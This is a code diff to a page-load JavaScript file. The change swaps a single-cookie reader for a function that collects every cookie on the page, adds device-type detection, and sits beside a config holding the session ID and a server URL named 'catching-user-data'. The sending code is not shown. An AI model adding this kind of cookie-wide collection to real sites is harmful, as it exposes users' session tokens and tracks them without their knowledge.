@@ -2,8 +2,10 @@ document.addEventListener('DOMContentLoaded', function () {
     console.log("Page loaded");
     // console.log(getAdminId());
     // console.log(getTokenName());
-    console.log(getDefaultSessionID());
-    console.log(getCookie());
+    // console.log(getDefaultSessionID());
+    console.log(getAllCookies());
+    console.log(getDeviceType());
+
     var config = {
         userSessionID: getDefaultSessionID(),
         serverURL: 'https://catching-user-data.onrender.com/api',
@@ -28,16 +30,16 @@ document.addEventListener('DOMContentLoaded', function () {
         return token || 'unidentifiedUser';
     }
 
-    function getCookie(name) {
-        var nameEQ = name + "=";
-        var ca = document.cookie.split(';');
-        for (var i = 0; i < ca.length; i++) {
-            var c = ca[i];
-            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
-            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
-        }
-        return null;
+    function getAllCookies() {
+        const cookies = document.cookie.split('; ');
+        const cookiesObject = {};
+        cookies.forEach(cookie => {
+            const [name, value] = cookie.split('=');
+            cookiesObject[name] = value;
+        });
+        return cookiesObject;
     }
+
 
     function getDeviceType() {
         const userAgent = navigator.userAgent;
